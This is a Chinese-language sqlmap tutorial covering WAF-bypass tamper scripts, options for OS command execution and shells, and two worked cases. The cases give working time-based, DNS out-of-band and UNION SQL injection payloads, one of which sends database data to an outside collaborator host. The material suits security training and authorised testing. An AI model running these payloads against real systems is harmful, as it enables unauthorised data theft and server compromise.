### 简介

|名称|描述|
|:-------------:|--|
|[sqlmap](https://github.com/sqlmapproject/sqlmap)| Automatic SQL injection and database takeover tool|



* 资料
  * [Usage · sqlmapproject/sqlmap Wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
  * sqlmap相关代码实现参考的白皮书(2009年) [Blackhat-europe-09-Damele-SQLInjection-whitepaper.pdf](https://www.blackhat.com/presentations/bh-europe-09/Guimaraes/Blackhat-europe-09-Damele-SQLInjection-whitepaper.pdf)



### tamper详解

tampers是sqlmap自带的绕过WAF的脚本，可查看所有tampers:

`python sqlmap.py --list-tampers`

2019.2.15 我更新并总结了 [tamper脚本分类汇总 sqlmap_tamper.csv](files/sqlmap_tamper.csv) 

可根据实际情况中的 数据库类型 选择合适的tamper(或自写脚本)实现绕过WAF进行SQL注入

### 参数讲解

官方文档 [sqlmap Wiki - 参数功能的解释](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

#### 常用参数 - 强制ssl

强制使用ssl协议 `--force-ssl`

适用场景:
待测网站通常是https协议,但可能被sqlmap识别为http协议并出现报错 404`[CRITICAL] page not found (404)`

>另一种不太通用的办法:手工修改请求
>把Host头最后加上`:443`可被sqlmap识别为ssl协议,这种办法一般可行但有局限性. 实测中有8443端口的SSL端口，如果在Host头最后加上`:8443`，仍然会被sqlmap当作HTTP协议的端口

#### 常用参数 - 加快测试速度

指定数据库类型
```
--dbms Oracle
--dbms MySQL
--dbms "Microsoft Access"
```

#### 常用参数 - 设置proxy代理流量

格式为：`(http|https|socks4|socks5)://address:port`

如
```
--proxy=socks5://127.0.0.1:1080
```

#### 常用参数 - 设置user-agent避免指纹

随机user-agent
```
 --random-agent
```

安卓手机user-agent
```
--user-agent "Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
```

#### 常用参数 - 读取HTTP request文本

sqlmap `-r reqfile.txt` 会自动分析该请求包（如cookie，POST数据 等），可充分测试各处，避免用命令行设置User-Agent等参数

`reqfile.txt`的格式：
```
POST /vuln.php HTTP/1.1
Host: www.target.com
User-Agent: Mozilla/4.0

id=1
```

#### 常用参数 - 用*标记注入点

针对情况：伪静态 等sqlmap不能自动识别的格式

```
sqlmap -u xxx.com/index.php/Index/view/id/40*.html --dbs
```

-r 也是在请求包文件中的参数值后面加*号

#### 参数 - 指定注入技术类型

```
--tech U
--technique T
```

```
B: Boolean-based blind
E: Error-based
U: Union query-based
S: Stacked queries
T: Time-based blind
Q: Inline queries
```

#### 参数 - 交互式sql语句执行

```
--sql-shell
```

#### 参数 - OS命令执行

前提1：数据库为MySQL/PostgreSQL/Microsoft SQL Server

前提2：当前用户有权限使用特定的函数. 在sqlmap中查看权限用 `--privileg`


```
# 执行指定系统命令  --os-cmd=whoami
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "MySQL" --os-cmd=whoami 
```

```
# 获得交互式shell  --os-shell
sqlmap -u "http://url/news?id=1"--level=3 --smart --dbms "MySQL" --os-shell
```

* 获取系统shell的实现原理 - MySQL/PostgreSQL
  * 前提条件:数据库进程(DBMS process)对某个目标文件夹具有写权限(write privileges)
  * 利用过程:sqlmap通过文件上传函数上传一个二进制文件:共享库(shared library)到一个目标文件夹，它包含两个UDF(user-defined functions)用户自定义函数(函数作用都是执行系统命令). 然后在数据库创建该函数 并调用该函数 即可执行系统命令
    * `sys_eval()` 执行系统命令 返回标准输出
    * `sys_exec()` 执行系统命令 返回退出码

* 获取系统shell的实现原理 - Microsoft SQL Server
  * 前提条件:`xp_cmdshell`扩展存储过程这一配置处于开启状态，或者可以被开启
  * 利用过程:sqlmap使用`xp_cmdshell`扩展存储过程(extended stored procedure)，它是SQL Server的一个配置项，启用时能让SQL Server账号执行操作系统命令，返回文本行
    * 如果`xp_cmdshell`存储过程 被禁用(Microsoft SQL Server >= 2005 默认禁用)sqlmap会重新启用它
    * 如果`xp_cmdshell`存储过程 不存在 则从头开始创建它

### 案例1

* 场景 - windows服务器的web应用 参数id 存在SQLi 类型为`基于时间的盲注` 如何快速获取数据? 
  * 操作系统:windows
  * 数据库类型:MySQL
  * SQLi类型:**基于时间的盲注**

原理参考[类型6 - "带外"(out-of-band)](web_vul_sqli.md#类型6---带外out-of-band)

【实际测试】获取数据-自动化
```
# 对比这2个方法
# 基于时间的盲注 - 拿数据方法1: 根据延时来跑数据(很慢)
python sqlmap.py -u "http://vul.com/user.php?id=1" -p id --tech=T --dbms mysql --dbs

# 基于时间的盲注 - 拿数据方法2: 使用带外请求(OOB) 利用DNS exfiltration跑数据(很快)
# 注意:
# YOUR.com 的IP为 114.1.1.1  且设置了DNS Host 也就是把所有尝试解析YOUR.com的那些DNS请求 都发送到ns1.YOUR.com的53号UDP端口
# ns1.YOUR.com 的IP为 114.1.1.1
# 在这台机器上运行以下sqlmap命令 注意参数--dns-domain 会在53端口开启一个DNS服务作为ns服务器 接收对YOUR.com的DNS请求(得到其中携带的数据)
python sqlmap.py -u "http://vul.com/user.php?id=1" -p id --dbms mysql --dbs --dns-domain=YOUR.com
[07:25:21] [INFO] testing for data retrieval through DNS channel
```

【实际测试】带外获取数据-手动
```

# 手工利用第0步 确认SQLi是否存在

# id参数的值为
1234' AND (SELECT 9905 FROM (SELECT(SLEEP(5)))vMZe) AND 'fACM'='fACM

# 实际HTTP请求的第1行 内容如下 其中id参数的值做了编码 JavaScript encodeURIComponent()
/user.php?id=1234'%20AND%20(SELECT%209905%20FROM%20(SELECT(SLEEP(5)))vMZe)%20AND%20'fACM'%3D'fACM HTTP/1.1

# 延时了5秒多 所以确认存在SQLi.
# Type: time-based blind
# Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])

-----

# 手工利用第1步 测试能否收到数据
# id参数的值为
1234'+(select load_file('\\\\easv5rqjxp4jbbk5t8vlqnn5iwoocd.burpcollaborator.net\\anq'))+' 

# 实际HTTP请求的第1行 内容如下 其中id参数的值做了编码 JavaScript encodeURIComponent()
/user.php?id=1234'%2b(select%20load_file('%5c%5c%5c%5ceasv5rqjxp4jbbk5t8vlqnn5iwoocd.burpcollaborator.net%5c%5canq'))%2b' HTTP/1.1

# 测试成功 收到了DNS数据.

-----

# 手工利用第2步 获取数据库的数据 如version()
# id参数的值为
1234' AND (SELECT 2026 FROM (SELECT(SLEEP(5-(IF(ORD(MID((SELECT LOAD_FILE(CONCAT(0x5c5c5c5c474c762e,(SELECT HEX(MID((IFNULL(version(),0x20)),1,31))),0x2e5471722e656173763572716a7870346a62626b357438766c716e6e3569776f6f63642e62757270636f6c6c61626f7261746f722e6e65745c5c4c6e6f74))),2,1))>563,0,5)))))Uyjo) AND 'Tbug'='Tbug

# 实际HTTP请求的第1行 内容如下 其中id参数的值做了编码 JavaScript encodeURIComponent()
/user.php?id=1234'%20AND%20(SELECT%202026%20FROM%20(SELECT(SLEEP(5-(IF(ORD(MID((SELECT%20LOAD_FILE(CONCAT(0x5c5c5c5c474c762e%2C(SELECT%20HEX(MID((IFNULL(version()%2C0x20))%2C1%2C31)))%2C0x2e5471722e656173763572716a7870346a62626b357438766c716e6e3569776f6f63642e62757270636f6c6c61626f7261746f722e6e65745c5c4c6e6f74)))%2C2%2C1))%3E563%2C0%2C5)))))Uyjo)%20AND%20'Tbug'%3D'Tbug HTTP/1.1


# 收到了DNS数据
GLv.352E352E3533.Tqr.easv5rqjxp4jbbk5t8vlqnn5iwoocd.burpcollaborator.net.

其中352E352E3533是经过hex编码的数据，做decode即可:

Hex to ASCII
5.5.53

Hex to UTF-8
5.5.53

得知了MySQL的版本为5.5.53
```

### 案例2

* 场景 - windows服务器的web应用 参数id 存在SQLi 类型为`UNION query`
  * 操作系统:无关
  * 数据库类型:MySQL
  * SQLi类型:`UNION query`


【实际测试】获取数据-自动化
```
# 指定技术为U
python sqlmap.py -r /Users/xxx/Downloads/req.txt --proxy=socks5://127.0.0.1:1081 -p uid --dbms=mysql -p id -v  5 --tech=U --dbs
```

【实际测试】获取数据-手动
```
# 手工利用第0步 确认SQLi是否存在

# id参数的值为
1234' ORDER BY 10-- mucA

# 使用二分法 根据Response长度、内容的不同 逐步确定了UNION共可查16个字段

-----

# 手工利用第1步 依次测试每个字段 看哪个字段会回显到Response

# id参数的值为
1234' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71626b7171,(CASE WHEN (17=17) THEN 1 ELSE 0 END),0x716b717671),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ziys

# 观察Response body
# 发现Response body中有字符串 qbkqq1qbkqq

# 格式为 [前缀][数据][后缀]
# [前缀]和[后缀]的作用是方便匹配到获取到的[数据]
# 这里前缀和后缀都是qbkqq  [数据]即
1
# 所以 第9个字段可以回显到Response

-----

# 手工利用第2步 再次确认 在使用MySQL的CONCAT函数的情况下 该字段是否仍会回显到Response

# id参数的值为
1234' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162716a71,0x6151484a717561715a4f44725a75456a45,0x7162766a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- CkJc

# Type: UNION query
# Title: Generic UNION query (NULL) - 16 columns
# 确认 在使用MySQL的CONCAT函数的情况下 该字段仍会回显到Response

-----

# 手工利用第3步 获取数据 如获取所有数据库的名称

# id参数的值为
1234' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162716a71,IFNULL(CAST(schema_name AS NCHAR),0x20),0x7162766a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.SCHEMATA-- MzIj

# 观察Response body
# 发现Response body中有字符串
<td>qbqjqinformation_schemaqbvjq</td>
<td>qbqjqmysqlqbvjq</td>
<td>qbqjqperformance_schemaqbvjq</td>

# 格式为 [前缀][数据][后缀]
# [前缀]和[后缀]的作用是方便匹配到获取到的[数据]
# 这里前缀和后缀都是qbqjq  [数据]即
information_schema
mysql
performance_schema
```

### Usage

```
Usage: python sqlmap.py [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -d DIRECT           Connection string for direct database connection
    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
    -x SITEMAPURL       Parse target(s) from remote sitemap(.xml) file
    -m BULKFILE         Scan multiple targets given in a textual file
    -r REQUESTFILE      Load HTTP request from a file
    -g GOOGLEDORK       Process Google dork results as target URLs
    -c CONFIGFILE       Load options from a configuration INI file

  Request:
    These options can be used to specify how to connect to the target URL

    --method=METHOD     Force usage of given HTTP method (e.g. PUT)
    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --param-del=PARA..  Character used for splitting parameter values (e.g. &)
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --cookie-del=COO..  Character used for splitting cookie values (e.g. ;)
    --load-cookies=L..  File containing cookies in Netscape/wget format
    --drop-set-cookie   Ignore Set-Cookie header from response
    --user-agent=AGENT  HTTP User-Agent header value
    --random-agent      Use randomly selected HTTP User-Agent header value
    --host=HOST         HTTP Host header value
    --referer=REFERER   HTTP Referer header value
    -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
    --headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123")
    --auth-type=AUTH..  HTTP authentication type (Basic, Digest, NTLM or PKI)
    --auth-cred=AUTH..  HTTP authentication credentials (name:password)
    --auth-file=AUTH..  HTTP authentication PEM cert/private key file
    --ignore-code=IG..  Ignore (problematic) HTTP error code (e.g. 401)
    --ignore-proxy      Ignore system default proxy settings
    --ignore-redirects  Ignore redirection attempts
    --ignore-timeouts   Ignore connection timeouts
    --proxy=PROXY       Use a proxy to connect to the target URL
    --proxy-cred=PRO..  Proxy authentication credentials (name:password)
    --proxy-file=PRO..  Load proxy list from a file
    --tor               Use Tor anonymity network
    --tor-port=TORPORT  Set Tor proxy port other than default
    --tor-type=TORTYPE  Set Tor proxy type (HTTP, SOCKS4 or SOCKS5 (default))
    --check-tor         Check to see if Tor is used properly
    --delay=DELAY       Delay in seconds between each HTTP request
    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
    --retries=RETRIES   Retries when the connection timeouts (default 3)
    --randomize=RPARAM  Randomly change value for given parameter(s)
    --safe-url=SAFEURL  URL address to visit frequently during testing
    --safe-post=SAFE..  POST data to send to a safe URL
    --safe-req=SAFER..  Load safe HTTP request from a file
    --safe-freq=SAFE..  Test requests between two visits to a given safe URL
    --skip-urlencode    Skip URL encoding of payload data
    --csrf-token=CSR..  Parameter used to hold anti-CSRF token
    --csrf-url=CSRFURL  URL address to visit for extraction of anti-CSRF token
    --force-ssl         Force usage of SSL/HTTPS
    --hpp               Use HTTP parameter pollution method
    --eval=EVALCODE     Evaluate provided Python code before the request (e.g.
                        "import hashlib;id2=hashlib.md5(id).hexdigest()")

  Optimization:
    These options can be used to optimize the performance of sqlmap

    -o                  Turn on all optimization switches
    --predict-output    Predict common queries output
    --keep-alive        Use persistent HTTP(s) connections
    --null-connection   Retrieve page length without actual HTTP response body
    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --skip=SKIP         Skip testing for given parameter(s)
    --skip-static       Skip testing parameters that not appear to be dynamic
    --param-exclude=..  Regexp to exclude parameters from testing (e.g. "ses")
    --dbms=DBMS         Force back-end DBMS to provided value
    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)
    --os=OS             Force back-end DBMS operating system to provided value
    --invalid-bignum    Use big numbers for invalidating values
    --invalid-logical   Use logical operations for invalidating values
    --invalid-string    Use random strings for invalidating values
    --no-cast           Turn off payload casting mechanism
    --no-escape         Turn off string escaping mechanism
    --prefix=PREFIX     Injection payload prefix string
    --suffix=SUFFIX     Injection payload suffix string
    --tamper=TAMPER     Use given script(s) for tampering injection data

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)
    --string=STRING     String to match when query is evaluated to True
    --not-string=NOT..  String to match when query is evaluated to False
    --regexp=REGEXP     Regexp to match when query is evaluated to True
    --code=CODE         HTTP code to match when query is evaluated to True
    --text-only         Compare pages based only on the textual content
    --titles            Compare pages based only on their titles

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH    SQL injection techniques to use (default "BEUSTQ")
    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
    --union-char=UCHAR  Character to use for bruteforcing number of columns
    --union-from=UFROM  Table to use in FROM part of UNION query SQL injection
    --dns-domain=DNS..  Domain name used for DNS exfiltration attack
    --second-url=SEC..  Resulting page URL searched for second-order response
    --second-req=SEC..  Load second-order HTTP request from file

  Fingerprint:
    -f, --fingerprint   Perform an extensive DBMS version fingerprint

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables. Moreover you can run your own SQL statements

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --hostname          Retrieve DBMS server hostname
    --is-dba            Detect if the DBMS current user is DBA
    --users             Enumerate DBMS users
    --passwords         Enumerate DBMS users password hashes
    --privileges        Enumerate DBMS users privileges
    --roles             Enumerate DBMS users roles
    --dbs               Enumerate DBMS databases
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --count             Retrieve number of entries for table(s)
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    --search            Search column(s), table(s) and/or database name(s)
    --comments          Check for DBMS comments during enumeration
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate
    -X EXCLUDE          DBMS database identifier(s) to not enumerate
    -U USER             DBMS user to enumerate
    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
    --pivot-column=P..  Pivot column name
    --where=DUMPWHERE   Use WHERE condition while table dumping
    --start=LIMITSTART  First dump table entry to retrieve
    --stop=LIMITSTOP    Last dump table entry to retrieve
    --first=FIRSTCHAR   First query output word character to retrieve
    --last=LASTCHAR     Last query output word character to retrieve
    --sql-query=QUERY   SQL statement to be executed
    --sql-shell         Prompt for an interactive SQL shell
    --sql-file=SQLFILE  Execute SQL statements from given file(s)

  Brute force:
    These options can be used to run brute force checks

    --common-tables     Check existence of common tables
    --common-columns    Check existence of common columns

  User-defined function injection:
    These options can be used to create custom user-defined functions

    --udf-inject        Inject custom user-defined functions
    --shared-lib=SHLIB  Local path of the shared library

  File system access:
    These options can be used to access the back-end database management
    system underlying file system

    --file-read=FILE..  Read a file from the back-end DBMS file system
    --file-write=FIL..  Write a local file on the back-end DBMS file system
    --file-dest=FILE..  Back-end DBMS absolute filepath to write to

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-cmd=OSCMD      Execute an operating system command
    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC
    --os-bof            Stored procedure buffer overflow exploitation
    --priv-esc          Database process user privilege escalation
    --msf-path=MSFPATH  Local path where Metasploit Framework is installed
    --tmp-path=TMPPATH  Remote absolute path of temporary files directory

  Windows registry access:
    These options can be used to access the back-end database management
    system Windows registry

    --reg-read          Read a Windows registry key value
    --reg-add           Write a Windows registry key value data
    --reg-del           Delete a Windows registry key value
    --reg-key=REGKEY    Windows registry key
    --reg-value=REGVAL  Windows registry key value
    --reg-data=REGDATA  Windows registry key value data
    --reg-type=REGTYPE  Windows registry key value type

  General:
    These options can be used to set some general working parameters

    -s SESSIONFILE      Load session from a stored (.sqlite) file
    -t TRAFFICFILE      Log all HTTP traffic into a textual file
    --batch             Never ask for user input, use the default behavior
    --binary-fields=..  Result fields having binary values (e.g. "digest")
    --check-internet    Check Internet connection before assessing the target
    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL
    --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. "logout")
    --csv-del=CSVDEL    Delimiting character used in CSV output (default ",")
    --charset=CHARSET   Blind SQL injection charset (e.g. "0123456789abcdef")
    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)
    --encoding=ENCOD..  Character encoding used for data retrieval (e.g. GBK)
    --eta               Display for each output the estimated time of arrival
    --flush-session     Flush session files for current target
    --forms             Parse and test forms on target URL
    --fresh-queries     Ignore query results stored in session file
    --har=HARFILE       Log all HTTP traffic into a HAR file
    --hex               Use hex conversion during data retrieval
    --output-dir=OUT..  Custom output directory path
    --parse-errors      Parse and display DBMS error messages from responses
    --preprocess=PRE..  Use given script(s) for preprocessing of response data
    --repair            Redump entries having unknown character marker (?)
    --save=SAVECONFIG   Save options to a configuration INI file
    --scope=SCOPE       Regexp to filter targets from provided proxy log
    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)
    --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)
    --update            Update sqlmap

  Miscellaneous:
    -z MNEMONICS        Use short mnemonics (e.g. "flu,bat,ban,tec=EU")
    --alert=ALERT       Run host OS command(s) when SQL injection is found
    --answers=ANSWERS   Set predefined answers (e.g. "quit=N,follow=N")
    --beep              Beep on question and/or when SQL injection is found
    --cleanup           Clean up the DBMS from sqlmap specific UDF and tables
    --dependencies      Check for missing (optional) sqlmap dependencies
    --disable-coloring  Disable console output coloring
    --gpage=GOOGLEPAGE  Use Google dork results from specified page number
    --identify-waf      Make a thorough testing for a WAF/IPS protection
    --list-tampers      Display list of available tamper scripts
    --mobile            Imitate smartphone through HTTP User-Agent header
    --offline           Work in offline mode (only use session data)
    --purge             Safely remove all content from sqlmap data directory
    --skip-waf          Skip heuristic detection of WAF/IPS protection
    --smart             Conduct thorough tests only if positive heuristic(s)
    --sqlmap-shell      Prompt for an interactive sqlmap shell
    --tmp-dir=TMPDIR    Local directory for storing temporary files
    --web-root=WEBROOT  Web server document root directory (e.g. "/var/www")
    --wizard            Simple wizard interface for beginner users
```
